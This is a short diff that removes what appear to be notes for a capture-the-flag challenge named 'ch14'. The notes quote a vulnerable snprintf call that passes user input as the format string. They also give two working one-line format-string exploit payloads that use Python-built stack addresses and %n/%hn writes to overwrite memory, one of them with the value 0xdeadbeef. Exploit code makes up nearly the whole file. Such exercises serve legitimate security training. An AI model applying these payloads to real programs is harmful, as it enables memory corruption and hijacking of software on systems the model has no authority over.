@@ -1,8 +1,0 @@
-error:
-snprintf( fmt, sizeof(fmt), argv[1] );
-
-
-./ch14 $(python -c 'print "\xd8\xf9\xff\xbf" + "\xd9\xf9\xff\xbf" + "\xda\xf9\xff\xbf" + "\xdb\xf9\xff\xbf" + "%223c" + "%9$n" + "%207c" + "%10$n" + "%239c" + "%11$n" + "%49c" + "%12$n"')
-
-./ch14 $(python -c 'print "\xf8\xf9\xff\xbf" + "\xfa\xf9\xff\xbf" + "%" + str(0xbeef - 8) + "x%9$hn" + "%" + str(0xdead - 0xbeef) + "x%10$hn"')
-
